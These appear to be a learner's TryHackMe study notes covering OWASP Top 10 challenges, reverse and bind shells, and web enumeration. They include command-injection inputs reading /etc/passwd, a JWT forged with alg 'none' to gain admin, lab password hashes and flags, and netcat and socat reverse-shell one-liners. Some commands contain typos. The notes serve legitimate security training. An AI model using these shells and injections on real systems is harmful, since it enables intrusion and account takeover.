# Web Hacking Fundamentals

## OWASP Top 10 - 2021

1. IDOR Challenge
    a. Find the flag by changing url id: `http://10.10.111.64/note.php?note_id=0`
2. Cryptography Failures
    a. SQLite3
	i. 'PRAGMA table_info(customers)'
	ii. '.tables'
    b. Password Hash cracking
3. 

[crackstation](https://crackstation.net/)

**Cryptographic Failures: Database and Hash**

```
# SQLite3
>>> sqlite3 webapp.db
>>> .tables
sessions  users
>>> sqlite> PRAGMA table_info(users);
0|userID|TEXT|1||1
1|username|TEXT|1||0
2|password|TEXT|1||0
3|admin|INT|1||0

sqlite> SELECT * FROM users;
4413096d9c933359b898b6202288a650|admin|6eea9b7ef19179a06954edd0f6c05ceb|1
23023b67a32488588db1e28579ced7ec|Bob|ad0234829205b9033196ba818f7a872b|1
4e8423b514eef575394ff78caed3254d|Alice|268b38ca7b84f44fa0a6cdc86e6301e0|0

> admin pw: qwertyuiop
> THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}
```

**Injections**

```
>>> ;ls
css
drpepper.txt
index.php
js
>>> ;whoami
apache
>>> ;ps -ef
root      0:00 {docker-entrypoi} /bin/sh /docker-entrypoint.sh
>>> ;cat /etc/alpine-release
>>> ;cat /etc/passwd | grep 'usr'
```

**Insecure Password Reset**

```
color: green
2JM0BPiu3yO5kx
>>> user: joseph; password: 2JM0BPiu3yO5kx
THM{Not_3ven_c4tz_c0uld_sav3_U!}
```

**Security Misconfiguration**

[OWASP - Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
```{python}
>>> import os; print(os.open("ls -l").read())
>>> import os; print(os.open("cat app.py").read())
THM{Just_a_tiny_misconfiguration}
```

**Outdated Components**

[exploit db](https://www.exploit-db.com/)


**Identification and Authentification Failures**

```
username: ' darren'
fe86079416a21a3c99937fea8874b667
username: ' arthur'
d9ac0f7db4fda460ac3edeb75d75e16e
```

[SRI Hash Generator](https://www.srihash.org/)

**Data Integrity Failures**

- Cookie: `header.payload.signature`
- We take the cookie from the guest login and modify the header so that:
    * changing `"alg":"HS256"` to `alg:"none"`
    * changing `"username":"guest"` to  `"username":"admin"`

```
--Example--
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjY1MDc2ODM2fQ.C8Z3gJ7wPgVLvEUonaieJWBJBYt5xOph2CpIhlxqdUw

>>> echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9" | base64 -d
>>> echo "eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjY1MDc2ODM2fQ" | base64 -d
>>> echo "C8Z3gJ7wPgVLvEUonaieJWBJBYt5xOph2CpIhlxqdUw" | base64 -d

{"typ":"JWT","alg":"HS256"} 
{"username":"guest","exp":1665076836}
w>KE(%`Iya*H\juL`)


--Challenge--
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjgzNjAwMjc4fQ.HpAi26xMBAaYWpo5SQipEqHYq_M7r8fTjxw0zGO1P5Y

>>> echo 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9' | base64 -d
{"username":"guest","exp":1683600278}
>>> echo 'eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjgzNjAwMjc4fQ' | base64 -d
>>> echo '{"typ":"JWT","alg":"none"}' | base64
>>> echo '{"username":"admin","exp":1683600278}' | base64
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0K
eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjgzNjAwMjc4fQo=


eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0K.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjgzNjAwMjc4fQo=.

THM{Dont_take_cookies_from_strangers}
```

**Security Logging and Monitoring Failures**



## What the Shell 

[site](https://tryhackme.com/room/introtoshells)

- Tools to access shells:
    - netcat
    - socat
    - metasploit
    - msfvenom
- Difference between reverse shells and bind shells:
    * reverse shells: execute back to our computer
    * bind shells: execute code on target's computer
- How to make reverse shell attack:
    - We need to establish a connection between our computer and target
    - our computer: `sudo nc - lvpn 443`
    - target's computer: `nc <local-ip> <port> -e /bin/bash`
- How to make bind shell attacks: (we assume that there is already a connection)
    - our computer: `nc <machine_ip> <port>`
    - target's computer: `nc -lvpn -e "cmd.exe"`
- Stabilizing shell:
    - with Python: `python -c 'import pty;pty.spwan("/bin/bash")'`; 'stty'
    - using 'rlwrap': `rlwrap nc -lvpn <port>; ssty raw -echo; fg`
    - using 'socat': `sudo python3 -m http.server 80; wget <local-ip>/socat -O /tmp/socat`
- Socat:
    - `socat TCP-L:<port>`
    - Encrypted shells:
	- `openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt; cat shell.key shell.crt > shell.pem; socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`
	- `socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`

- Passing arguments:
    - pty:
    - stderr
    - sigint
    - setsid
    - sane
- `mkfifo`


[reverse shell cheat sheet](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
[payloads ](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

```
>>> socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 EXEC:/bin/bash (erronous)
>>> socat OPENSSL:10.10.10.5:53,verify=0 


```

- msfvenom


## Web Enumeration

[site](https://tryhackme.com/room/webenumerationv2)

- Gobuster modes:
    - dir: enumerate website directories
    - dns: brute forcing subdomains
    - vhost: brute force virtual hosts
- 

**Gobuster**
```
>>> gobuster -u http://10.10.28.255 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-1.0.txt -t 64
images,Changes,VIDEO
>>> gobuster -u http://10.10.28.255/Changes -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-1.0.txt -x html,js,conf,txt
>>>  
```

**wpscan**


**nikto**


## Upload Vulnerabilities

- adding hosts: `sudo /etc/hosts`


```

```


